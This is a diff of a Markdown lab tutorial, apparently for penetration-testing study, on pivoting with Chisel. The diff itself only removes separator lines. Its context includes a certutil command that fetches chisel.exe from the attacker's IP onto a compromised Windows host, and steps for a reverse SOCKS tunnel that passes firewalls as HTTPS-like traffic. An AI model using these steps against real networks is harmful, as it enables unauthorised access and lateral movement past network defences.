@@ -13,7 +13,6 @@ Direct inbound connections to your target are blocked. Firewall rules, NAT, what
 
 That's the scenario Chisel is built for. The target connects outward to you, and the tunnel goes in the other direction.
 
----
 
 ## Lab Environment
 
@@ -22,7 +21,6 @@ That's the scenario Chisel is built for. The target connects outward to you, and
 - Internal services running on foothold's loopback: MySQL (`3306`), HTTP (`8083`)
 - Goal: reach both services from Kali
 
----
 
 ## Step 1 — Get Chisel on Both Machines
 
@@ -46,7 +44,6 @@ certutil -urlcache -split -f "http://192.168.100.10/chisel.exe" chisel.exe
 
 Make sure the versions match. Mismatched versions still connect but you'll see a warning in the logs.
 
----
 
 ## Step 2 — Start the Chisel Server on Kali
 
@@ -66,7 +63,6 @@ Output:
 
 Note the fingerprint. You can use it on the client side for verification, though in lab environments most people skip that.
 
----
 
 ## Step 3 — Connect the Client from the Windows Shell
 
@@ -92,7 +88,6 @@ Back on Kali, the server confirms:
 
 The version mismatch warning is cosmetic — it still works. The important line is the last one: a SOCKS proxy is now listening on `127.0.0.1:1080` on your Kali machine. All traffic sent through that proxy exits from the Windows foothold.
 
----
 
 ## Two Approaches: Port Forwarding vs SOCKS
 
@@ -139,7 +134,6 @@ Configure `/etc/proxychains4.conf` to point to `socks5 127.0.0.1 1080`.
 
 Set Firefox proxy settings to SOCKS5, host `127.0.0.1`, port `1080`. Any internal HTTP service the foothold can reach, you can browse directly.
 
----
 
 ## What's Actually Happening
 
@@ -147,7 +141,6 @@ Chisel tunnels over WebSocket — it looks like HTTPS traffic to most firewalls.
 
 The SOCKS proxy sits on Kali's loopback. When a tool on Kali sends traffic through it, Chisel takes that traffic, sends it through the WebSocket tunnel to the Windows client, and the client sends it out from its own network interfaces — reaching things your Kali can't touch directly.
 
----
 
 ## Chisel vs Ligolo
 
